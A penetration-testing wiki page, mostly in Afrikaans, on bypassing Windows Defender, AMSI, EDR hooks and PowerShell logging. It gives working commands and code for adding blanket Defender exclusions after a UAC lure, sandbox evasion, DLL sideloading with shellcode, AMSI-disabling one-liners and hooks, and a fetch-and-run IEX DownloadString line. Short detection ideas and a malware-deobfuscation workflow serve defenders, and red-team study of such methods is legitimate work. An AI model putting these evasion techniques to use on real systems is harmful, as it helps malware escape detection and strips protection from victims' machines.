# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was initially written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n Instrument om Windows Defender te stop.
- [no-defender](https://github.com/es3n1n/no-defender): 'n Instrument om Windows Defender te stop deur 'n ander AV te fakes.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Openbare loaders wat voorgee om game cheats te wees, word dikwels as unsigned Node.js/Nexe installers versprei wat eers **die gebruiker om elevation vra** en dan eers Defender neuter. Die vloei is eenvoudig:

1. Probeer vir administrative context met `net session`. Die command slaag net wanneer die caller admin rights het, so 'n failure dui daarop dat die loader as 'n standaard gebruiker loop.
2. Relaunch homself onmiddellik met die `RunAs` verb om die verwagte UAC consent prompt te trigger terwyl die oorspronklike command line behoue bly.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Slagoffers glo reeds dat hulle “cracked” sagteware installeer, so die prompt word gewoonlik aanvaar, wat die malware die regte gee wat dit nodig het om Defender se beleid te verander.

### Blanket `MpPreference` uitsluitings vir elke dryfleer

Sodra dit verhoog is, maksimeer GachiLoader-styl kettings Defender se blind spots in plaas daarvan om die diens direk te deaktiveer. Die loader maak eers die GUI watchdog toe (`taskkill /F /IM SecHealthUI.exe`) en stoot dan **uiters breë uitsluitings** sodat elke gebruikersprofiel, stelseldirektorie, en verwyderbare skyf onskandeerbaar word:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Sleutelwaarnemings:

- Die lus deursoek elke gemonteerde filesystem (D:\, E:\, USB-stokkies, ens.) so **enige toekomstige payload wat orals op skyf laat val word, word geïgnoreer**.
- Die `.sys` uitbreiding-uitsondering is toekomsgerig—aanvallers behou die opsie om unsigned drivers later te laai sonder om Defender weer aan te raak.
- Alle veranderinge land onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, wat latere stadiums laat bevestig dat die uitsonderings voortduur of dit laat uitbrei sonder om UAC weer te aktiveer.

Omdat geen Defender service gestop word nie, hou naïewe health checks aan om “antivirus active” te rapporteer, al raak real-time inspection nooit daardie paths nie.

## **AV Evasion Methodology**

Tans gebruik AVs verskillende metodes om te kyk of ’n file malicious is of nie: static detection, dynamic analysis, en vir die meer advanced EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende malicious strings of arrays of bytes in ’n binary of script te flag, en ook inligting uit die file self te haal (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende public tools jou makliker kan laat uitvang, omdat hulle waarskynlik al geanaliseer en as malicious gemerk is. Daar is ’n paar maniere om hierdie tipe detection te omseil:

- **Encryption**

As jy die binary encrypt, sal daar geen manier wees vir AV om jou program te detect nie, maar jy sal ’n soort loader nodig hê om die program in memory te decrypt en uit te voer.

- **Obfuscation**

Soms is al wat jy hoef te doen om ’n paar strings in jou binary of script te verander om dit by AV verby te kry, maar dit kan ’n tydrowende taak wees afhangend van wat jy probeer obfuscate.

- **Custom tooling**

As jy jou eie tools develop, sal daar geen bekende bad signatures wees nie, maar dit neem baie tyd en effort.

> [!TIP]
> ’n Goeie manier om teen Windows Defender static detection te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit split basies die file in multiple segments en laat dan Defender elkeen individueel scan; so kan dit vir jou presies sê wat die flagged strings of bytes in jou binary is.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor practical AV Evasion gaan kyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in ’n sandbox run en vir malicious activity watch (bv. probeer om jou browser se passwords te decrypt en lees, ’n minidump op LSASS te doen, ens.). Hierdie deel kan ’n bietjie moeiliker wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te evade.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dynamic analysis te bypass. AVs het baie min time om files te scan om nie die user se workflow te onderbreek nie, so lang sleeps kan die analysis van binaries versteur. Die probleem is dat baie AV sandboxes net die sleep kan skip, afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Gewoonlik het Sandboxes baie min resources om mee te werk (bv. < 2GB RAM), anders kan hulle die user se machine vertraag. Jy kan ook hier baie kreatief raak, byvoorbeeld deur die CPU se temperature of selfs die fan speeds te check; nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy ’n user wil target wie se workstation by die "contoso.local" domain aangesluit is, kan jy ’n check op die computer se domain doen om te sien of dit ooreenstem met die een wat jy gespecify het; as dit nie ooreenstem nie, kan jy jou program laat exit.

Dit blyk dat Microsoft Defender se Sandbox computername HAL9TH is, so jy kan voor detonation vir die computer name in jou malware check; as die naam HAL9TH match, beteken dit jy is binne defender se sandbox, so jy kan jou program laat exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar regtig goeie tips van [@mgeeky](https://twitter.com/mariuszbit) vir gebruik teen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons vroeër in hierdie post gesê het, **public tools** sal uiteindelik **gedetect word**, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy ’n ander project gebruik wat minder bekend is en ook LSASS dump.

Die regte antwoord is waarskynlik die laaste een. Neem mimikatz as voorbeeld: dit is waarskynlik een van, indien nie die mees flagged stuk malware deur AVs en EDRs nie; terwyl die project self baie cool is, is dit ook ’n nagmerrie om mee te werk om AVs te omseil, so kyk maar net vir alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir evasion verander, maak seker jy **turn off automatic sample submission** in defender, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel is om op die lang termyn evasion te bereik. As jy wil check of jou payload deur ’n spesifieke AV gedetect word, install dit op ’n VM, probeer om die automatic sample submission af te turn off, en test dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, **prioritize altyd die gebruik van DLLs vir evasion**, na my ervaring word DLL files gewoonlik **baie minder gedetect en geanaliseer**, so dit is ’n baie eenvoudige trick om in sommige gevalle detection te vermy (as jou payload natuurlik ’n manier het om as ’n DLL te run).

Soos ons in hierdie image kan sien, het ’n DLL Payload van Havoc ’n detection rate van 4/26 in antiscan.me, terwyl die EXE payload ’n detection rate van 7/26 het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nou sal ons ’n paar tricks wys wat jy met DLL files kan gebruik om baie meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak gebruik van die DLL search order wat deur die loader gebruik word deur beide die victim application en malicious payload(s) langs mekaar te plaas.

Jy kan kyk vir programs wat vatbaar is vir DLL Sideloading met behulp van [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, uitvoer.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable-programme self verken**; hierdie tegniek is redelik stealthy as dit reg gedoen word, maar as jy publiek bekende DLL Sideloadable-programme gebruik, kan jy maklik gevang word.

Net deur ’n kwaadwillige DLL met die naam wat ’n program verwag om te laai, te plaas, sal jou payload nie gelaai word nie, aangesien die program sekere spesifieke functions binne daardie DLL verwag. Om hierdie probleem reg te stel, sal ons ’n ander tegniek gebruik genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die calls wat ’n program maak van die proxy (en kwaadwillige) DLL na die oorspronklike DLL aan, en behou dus die program se functionality en maak dit moontlik om die uitvoering van jou payload te hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik

Hier is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal vir ons 2 lêers gee: ’n DLL-bronkode-sjabloon, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Dit is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (geënkodeer met [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het ’n 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Ek sou dit ’n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek **beveel sterk aan** dat jy [S3cur3Th1sSh1t se twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk, en ook [ippsec se video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons in meer diepte bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE-modules kan funksies uitvoer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die export entry ’n ASCII-string in die vorm `TargetDll.TargetFunc`. Wanneer ’n caller die export resolve, sal die Windows loader:

- `TargetDll` laai as dit nog nie reeds gelaai is nie
- `TargetFunc` daaruit resolve

Belangrike gedrag om te verstaan:
- As `TargetDll` ’n KnownDLL is, word dit uit die beskermde KnownDLLs namespace voorsien (bv. ntdll, kernelbase, ole32).
- As `TargetDll` nie ’n KnownDLL is nie, word die normale DLL search order gebruik, wat die directory van die module insluit wat die forward resolution doen.

Dit maak ’n indirekte sideloading primitive moontlik: vind ’n signed DLL wat ’n funksie export wat forward is na ’n nie-KnownDLL module naam, en plaas dan daardie signed DLL saam met ’n attacker-controlled DLL wat presies genoem is soos die forwarded target module. Wanneer die forwarded export aangeroep word, resolve die loader die forward en laai jou DLL uit dieselfde directory, en voer jou DllMain uit.

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, so dit word opgelos via normale soekvolgorde.

PoC (copy-paste):
1) Kopieer die ondertekende stelsel-DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Laat val 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n Minimum DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die deurgestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Trigger die forward met 'n signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (onderteken) laai die side-by-side `keyiso.dll` (onderteken)
- Terwyl `KeyIsoSetAuditingInterface` opgelos word, volg die loader die forwarding na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, sal jy eers ná `DllMain` al uitgevoer het ’n "missing API" fout kry

Jagwenke:
- Fokus op forwarded exports waar die teikenmodule nie ’n KnownDLL is nie. KnownDLLs is gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports inventariseer met tooling soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder inventory om kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporing/defensie-idees:
- Monitor LOLBins (bv. rundll32.exe) wat getekende DLLs vanaf nie-stelsel-paaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Gee waarskuwing op proses/module-kettings soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` onder gebruiker-skryfbare paaie
- Dwing code integrity policies af (WDAC/AppLocker) en weier write+execute in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is 'n payload toolkit vir die omseiling van EDRs met behulp van suspended processes, direct syscalls, en alternatiewe uitvoeringsmetodes`

Jy kan Freeze gebruik om jou shellcode op 'n stealthy manier te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion is net ’n kat-en-muis-speletjie, wat vandag werk kan môre gedetecteer word, so moenie ooit op net een tool staatmaak nie; as dit moontlik is, probeer om multiple evasion techniques aan mekaar te koppel.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs plaas dikwels **user-mode inline hooks** op `ntdll.dll` syscall stubs. Om daardie hooks te omseil, kan jy **direct** of **indirect** syscall stubs genereer wat die korrekte **SSN** (System Service Number) laai en na kernel mode oorgaan sonder om die hooked export entrypoint uit te voer.

**Invocation options:**
- **Direct (embedded)**: emit a `syscall`/`sysenter`/`SVC #0` instruction in the generated stub (no `ntdll` export hit).
- **Indirect**: jump into an existing `syscall` gadget inside `ntdll` so the kernel transition appears to originate from `ntdll` (useful for heuristic evasion); **randomized indirect** picks a gadget from a pool per call.
- **Egg-hunt**: avoid embedding the static `0F 05` opcode sequence on disk; resolve a syscall sequence at runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infer SSNs by sorting syscall stubs by virtual address instead of reading stub bytes.
- **SyscallsFromDisk**: map a clean `\KnownDlls\ntdll.dll`, read SSNs from its `.text`, then unmap (bypasses all in-memory hooks).
- **RecycledGate**: combine VA-sorted SSN inference with opcode validation when a stub is clean; fall back to VA inference if hooked.
- **HW Breakpoint**: set DR0 on the `syscall` instruction and use a VEH to capture the SSN from `EAX` at runtime, without parsing hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **lêers op skyf** skandeer, so as jy op een of ander manier payloads **direk in memory** kon uitvoer, kon die AV niks doen om dit te keer nie, omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in hierdie komponente van Windows.

- User Account Control, of UAC (elevation van EXE, COM, MSI, of ActiveX installation)
- PowerShell (scripts, interaktiewe gebruik, en dinamiese code evaluation)
- Windows Script Host (wscript.exe en cscript.exe)
- JavaScript en VBScript
- Office VBA macros

Dit laat antivirus-oplossings toe om script behavior te inspekteer deur script contents bloot te stel in 'n vorm wat beide unencrypted en unobfuscated is.

Om `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` te laat loop, sal die volgende alert op Windows Defender produseer.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let daarop hoe dit `amsi:` vooraan sit en dan die path na die executable vanwaar die script geloop het, in hierdie geval, powershell.exe

Ons het geen file na disk geskryf nie, maar is steeds in memory gevang weens AMSI.

Verder, vanaf **.NET 4.8**, word C# code ook deur AMSI uitgevoer. Dit raak selfs `Assembly.Load(byte[])` om in-memory execution te laai. Daarom word die gebruik van laer weergawes van .NET (soos 4.7.2 of laer) aanbeveel vir in-memory execution as jy AMSI wil evasion.

Daar is 'n paar maniere om AMSI te omseil:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met static detections werk, kan die wysiging van die scripts wat jy probeer laai 'n goeie manier wees om detection te omseil.

AMSI het egter die vermoë om scripts te unobfuscate, selfs al het dit verskeie layers, so obfuscation kan 'n slegte opsie wees afhangend van hoe dit gedoen word. Dit maak evasion nie baie straightforward nie. Soms hoef jy egter net 'n paar variable names te verander en dan is jy reg, so dit hang af van hoe hard iets geflag is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer is deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) process te laai, is dit moontlik om dit maklik te tamper selfs wanneer jy as 'n unprivileged user hardloop. Weens hierdie flaw in die implementering van AMSI het researchers verskeie maniere gevind om AMSI scanning te evasion.

**Forcing an Error**

Om die AMSI-initialisering te laat fail (amsiInitFailed) sal daartoe lei dat geen scan vir die huidige process geïnisieer word nie. Oorspronklik is dit deur [Matt Graeber](https://twitter.com/mattifestation) bekend gemaak en Microsoft het 'n signature ontwikkel om wyer usage te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dit het net een reël powershell-kode gekos om AMSI vir die huidige powershell-proses onbruikbaar te maak. Hierdie reël is natuurlik deur AMSI self gemerk, so ’n paar wysigings is nodig om hierdie tegniek te gebruik.

Hier is ’n gewysigde AMSI bypass wat ek geneem het uit hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte, dat dit waarskynlik gemerk sal word sodra hierdie pos uitkom, so jy moet geen code publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

Hierdie tegniek is aanvanklik ontdek deur [@RastaMouse](https://twitter.com/_RastaMouse/) en dit behels om die address vir die "AmsiScanBuffer" function in amsi.dll te vind (verantwoordelik vir die scanning van die user-supplied input) en dit te oorskryf met instructions om die code vir E_INVALIDARG terug te gee; op hierdie manier sal die result van die actual scan 0 teruggee, wat as ’n clean result geïnterpreteer word.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir ’n meer gedetailleerde verduideliking.

Daar is ook baie ander techniques wat gebruik word om AMSI met powershell te bypass; kyk gerus na [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI word eers geïnisialiseer nadat `amsi.dll` in die current process gelaai is. ’n Robuuste, language-agnostic bypass is om ’n user-mode hook op `ntdll!LdrLoadDll` te plaas wat ’n error teruggee wanneer die aangevraagde module `amsi.dll` is. As gevolg hiervan laai AMSI nooit en vind geen scans vir daardie process plaas nie.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Werk oor PowerShell, WScript/CScript en custom loaders ewe veel (enigiets wat andersins AMSI sou laai).
- Kombineer dit met die voer van scripts oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang command-line artefakte te vermy.
- Word gesien in gebruik deur loaders wat deur LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` aanroep).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is 'n funksie wat jou toelaat om alle PowerShell-opdragte wat op 'n stelsel uitgevoer word, te log. Dit kan nuttig wees vir ouditering- en foutopsporingsdoeleindes, maar dit kan ook 'n **probleem wees vir attackers wat detection wil ontduik**.

Om PowerShell logging te omseil, kan jy die volgende tegnieke gebruik:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n tool soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, so jy kan jou scripts laat loop sonder om deur AMSI geskandeer te word. Jy kan dit doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell te spawn sonder verdediging (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke maak staat op data-enkripsie, wat die entropy van die binary sal verhoog en dit makliker sal maak vir AVs en EDRs om dit te detect. Wees versigtig hiermee en pas dalk net enkripsie toe op spesifieke afdelings van jou code wat sensitief is of versteek moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware analyseer wat ConfuserEx 2 (of commercial forks) gebruik, is dit algemeen om verskeie lae van protection teë te kom wat decompilers en sandboxes sal blokkeer. Die workflow hieronder herstel betroubaar **'n naby-oorspronklike IL** wat daarna na C# gedecompileer kan word in tools soos dnSpy of ILSpy.

1.  Anti-tampering removal – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die *module* static constructor (`<Module>.cctor`). Dit patch ook die PE checksum sodat enige modification die binary sal crash.  Gebruik **AntiTamperKiller** om die geënkripteerde metadata tables te vind, die XOR keys te herstel en 'n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* file aan **de4dot-cex** (’n ConfuserEx-aware fork van de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profile
• de4dot sal control-flow flattening ontdoen, oorspronklike namespaces, classes en variable names herstel en constant strings dekripteer.

3.  Proxy-call stripping – ConfuserEx vervang direkte method calls met liggewig wrappers (ook bekend as *proxy calls*) om decompilation verder te breek. Verwyder hulle met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API soos `Convert.FromBase64String` of `AES.Create()` in plaas van ondeursigtige wrapper functions (`Class8.smethod_10`, …) te sien.

4.  Manual clean-up – voer die resulterende binary onder dnSpy, soek vir groot Base64-blobs of `RijndaelManaged`/`TripleDESCryptoServiceProvider`-gebruik om die *real* payload te vind. Dikwels stoor die malware dit as 'n TLV-gekodeerde byte array wat binne `<Module>.byte_0` geïnisialiseer is.

Die bogenoemde ketting herstel execution flow **sonder** dat dit nodig is om die malicious sample te laat loop – nuttig wanneer jy op 'n offline workstation werk.

> 🛈  ConfuserEx produseer 'n custom attribute genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om samples outomaties te triage.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) compilation suite te verskaf wat verhoogde sagtewaresekuriteit kan bied deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om `C++11/14` language te gebruik om, by compile time, obfuscated code te genereer sonder om enige eksterne tool te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat gegenereer word deur die C++ template metaprogramming framework, wat die lewe van die persoon wat die application wil crack 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat in staat is om verskeie verskillende pe files te obfuscate, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fine-grained code obfuscation framework vir LLVM-supported languages met behulp van ROP (return-oriented programming). ROPfuscator obfuscate 'n program op die assembly code vlak deur gewone instructions te transformeer in ROP chains, en so ons natuurlike begrip van normale control flow te verydel.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor is in staat om bestaande EXE/DLL in shellcode om te skakel en dit dan te laai

## SmartScreen & MoTW

Jy mag dalk hierdie skerm gesien het toe jy sommige executables van die internet afgelaai en hulle uitgevoer het.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die end user te beskerm teen die uitvoer van potensieel malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputation-based approach, wat beteken dat uncommon download applications SmartScreen sal aktiveer en dus die end user waarsku en keer om die file uit te voer (alhoewel die file steeds uitgevoer kan word deur More Info -> Run anyway te klik).

